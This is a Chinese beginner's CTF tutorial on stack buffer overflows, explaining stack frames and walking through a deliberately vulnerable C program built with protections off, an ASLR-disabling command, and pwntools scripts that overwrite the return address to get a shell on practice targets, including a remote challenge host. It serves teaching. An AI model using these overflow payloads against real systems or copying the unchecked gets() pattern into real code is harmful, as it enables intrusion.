# 栈溢出
<font color=###000AAA>
    栈溢出是学习pwn的基础，也是pwn中最简单的题目。
    pwn入门，跟着ctfwiki一起学习pwn栈溢出。
</font>
#### <font face="微软雅黑" size=6 color=#FF0000 >一、栈溢出原理</font>
##### <font size=5>1、栈存储模式</font>
<font face="幼圆" color=#AAA>栈是一种数据结构，存储函数的局部变量，每次调用函数就会为当前调用的函数开辟栈空间，这样的空间被称为栈帧</font>
- 栈的存储对象是函数的局部变量和参数
- 函数调用栈的内存从高往低的方向伸展，先入栈的在高地址，后入的在低地址
- 栈内的变量写入时，是从低地址向高地址写入，所以溢出的时候，只能够覆盖高地址的内容(比输入变量地址高)
##### <font size=5>2、栈调用以及释放</font>
<font face="微软雅黑" color=#AAA>函数使用call来调用另外的函数</font>
- 首先父函数会先把后一个函数的参数压入栈，具体参数压入的顺序，不同的调用约定不同，这里不讨论

- 其次父函数会调用call函数来进入子函数，call的同时，会进行一系列的操作，其中包括把call的下一条指令的地址也就是ret_add压入栈，然后把子函数的第一条指令放入指令寄存器IR

- 之后就是push ebp; move ebp,esp; sub esp,xxx;这句话的意思是，把目前的ebp寄存内容入栈，并且把ebp指向当前栈顶,然后再开辟栈空间。
<div>
<image src=https://i.loli.net/2020/12/01/MqvxA6osEBTdmUY.png>
</div>
  **最后这里比较绕，主要是分析的时候想清楚，栈空间和IDA里面的那个地方，汇编语言的存储空间是不一样的，栈存储在栈存储空间。**
- 函数释放，是函数内的最后几行语句，一般会有**add esp,xxx**这里就是返回开辟的栈，然后会**pop ebp**; 这句话是弹出上个函数的ebp，恢复上个函数的栈帧，最后会ret这句是返回到上个函数的指令，即把ret_add放到指令寄存器中去，这样就完成了整个函数的调用，此外，函数调用时，eax默认存储返回值，所以有时候也会ret eax;还有一个**leave**函数，直接一步到位，完成上面所有函数，所以有时候也是leave函数来代替前面的函数。

##### <font size=5>3、函数的调用模式</font>
<font face="幼圆" color=#AAA>不同的结构有不同的调用约定，这里先不解释</font>
##### <font size=5>4、原理</font>
<font face="幼圆" color=#AAA>栈溢出即，有些函数会向用户请求输入，但是却没有做输入的限制，导致用户可以恶意的构造输入代码，从而达到在栈上面恶意执行shellcode或者覆盖变量和函数返回地址，从而达到控制程序getshell的方法</font>
- 主要的危险函数有
- get()函数
- strcpy()
- scanf()
- vscanf()
- 暂无，有一个记一个
#### <font face="微软雅黑" size=6 color=#FF0000 >二、栈溢出初体验</font>
<font face="幼圆" color=#AAA>下面来一个栈溢出的例题看看吧</font>
##### <font size=5>1、栈溢出例题</font>
**此处的例子来自ctfwiki**
- 首先在Ubuntu虚拟机里，编写一个C文件
```shell
vim stack1.c
```
```c
#include <stdio.h>
#include <string.h>
void success() { puts("You Hava already controlled it."); }
void vulnerable() {
  char s[12];
  gets(s);
  puts(s);
  return;
}
int main(int argc, char **argv) {
  vulnerable();
  return 0;
}
```
```shell
gcc -m32 -fno-stack-protector stack1.c -o stack1 -no-pie
```
如上方式去运行这个C程序，会得到一个stack1的文件，-m32表示生成32位的 -fno-stack-protector 表示不开启canary保护 -no-pie表示不开启PIE保护./访问这个文件可以运行，使用
```shell
checksec stack1
```
可以查看文件的具体详情，例如有没有开启canary或者PIE之类的。
![查内容.jpg](https://i.loli.net/2020/12/02/RHs61FM7qhALjbV.png)
这里是我查出来的，可以看到开启了PIE保护，这时候为了避免地址随机化要关闭ASLR，并且重新编译，记得带上-no-pie参数，如果有PIE地址还是会随机化
```shell
echo 0 > /proc/sys/kernel/randomize_va_space
```
把/proc/sys/kernel/randomize_va_space的文件内容改为0
0表示不开启地址随机化保护，1表示开启，2表示增强，一般是2，这里我们要改为1
然后打开ida分析stack1，找到main函数和vulnerable函数。
是这样的

```c
int vulnerable()
{
  char s; // [sp+4h] [bp-14h]@1

  gets(&s);
  return puts(&s);
}
```
看到ebp-14是s的开始，往低地址是栈底，那么ebp+4开始往高地址的话就应该是ret_add了，前面说过，变量内部是从低地址往高地址写内容的，所以我们写入s的时候，就可以先写入0x14的无效字符，然后再输入success的地址，就可以把返回地址改为success函数了，这样就实现了一次简单的栈溢出，首先查看一下success的地址，双击该函数即可查看0x8048456
使用python编写脚本。

```python
from pwn import *

p = process("./stack1")
fake = 0x14*'a'
ebp = 'bbbb'
ret_add = 0x8048456
payload = fake + ebp + p32(ret_add)
p.sendline(payload)
p.interactive()
```
![](https://ftp.bmp.ovh/imgs/2020/12/65a924d11264d096.jpg)
成功执行栈溢出
##### <font size=5>2、栈溢出的做题基本步骤</font>
- 首先要checksec查看基本信息
- 然后文件拖入IDA分析
- 在之后分析是否存在栈溢出的危险函数
- 查看后，如果存在，则查看请求字符串的栈结构，最好可以画出图形类似下图
```
                                           +-----------------+
                                           |     retaddr     |
                                           +-----------------+
                                           |     saved ebp   |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14-->+-----------------+
```
- 然后确定覆盖字符，注意ebp寻址还是esp寻址esp寻址要多加上8个字节。
- 最后寻找有没有危险函数直接拿到shell，有的话找出地址，填入返回地址
- 成功拿到shell
##### <font size=5>3、例题解析</font>
<font color=#AAA>此处再加上一个例题</font>
**例题来自攻防世界 int_overflow**
checksec一下
![](https://i.bmp.ovh/imgs/2020/12/0f36341c6bdbe644.png)
没有保护，拖进IDA分析。本地运行一下看个大概
![](https://i.bmp.ovh/imgs/2020/12/b53be581a5aaf0bd.png)
分析函数表，果然发现一个what_is_this函数，点进去看了一下system('cat flag')应该就是这里了，查看地址
![](https://i.bmp.ovh/imgs/2020/12/d5aed711a46fc321.png)
所以ret-add=0x804868B
再看一下main函数，看到了scanf('%d',v4)没有做输入限制，看一下V4的栈分配地址ebp-ch，ok懂了。
```
                                           +-----------------+
                                           |     retaddr     |
                                           +-----------------+
                                           |     saved ebp   |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0xC-->+-----------------+
```
大概是这样。写payload
```python
from pwn import *
p = remote('220.249.52.133',49645)
# 这里是连接靶机,process是相当于连接本机
fake = 0xC * 'a'
ebp = 'bbbb'
ret_add = p32(0x804868B)
payload = fake + ebp + ret_add
p.sendline(payload)
p.interactive()
```
运行一下,果然不对，哈哈哈，其实这不是一道地址栈溢出的题目，这是一道整形溢出的题目，这里先不说这个题，等到后来学的时候在做例题哈哈哈。
真正的题目在这里！！！**功夫世界level0**
老规矩check一下
![](https://i.bmp.ovh/imgs/2020/12/0f9e22f59f2feb86.png)
没有保护，运行一下
拖进ida分析
发现callsystem函数，定位在0x40059A(call的上一行)定下ret_add=0x40059A
分析main函数，发现调用了vulnarable_function，点进去看一下read了一个buff变量，分配了0x80的空间，但是读了0x200(512uLL)于是可以利用栈溢出
payload
```python
from pwn import *
p = remote('220.249.52.133',58994)
fake = 0x80 * 'a'
ebp = 'bbbb'
ret_add = p64(0x40059A)
payload = fake + ebp + ret_add
p.sendline(payload)
p.interactive()
```
发现没有拿到shell这是为什么呢，是不是64位程序有点不同？
仔细ida的xxx_function函数栈，发现ebp有8个字节。。。原来如此把上面的ebp改成'bbbbbbbb'
![](https://i.bmp.ovh/imgs/2020/12/2c98d6dffd066307.png)
记住64和32的不同！！！32位处处使用4字节而64位则使用8字节，所以就不一样了
运行一下，拿到shell
![](https://i.bmp.ovh/imgs/2020/12/52498e569ba87b2a.png)
栈溢出初级阶段就到这里吧.

此外如果是esp寻址，那么一般是要多加8个位置，最好还是gdb调试一下，断电下在函数入口，然后比较esp的值，加上偏移量算出s的地址，在根据s和ebp的地址差算出填充字符。

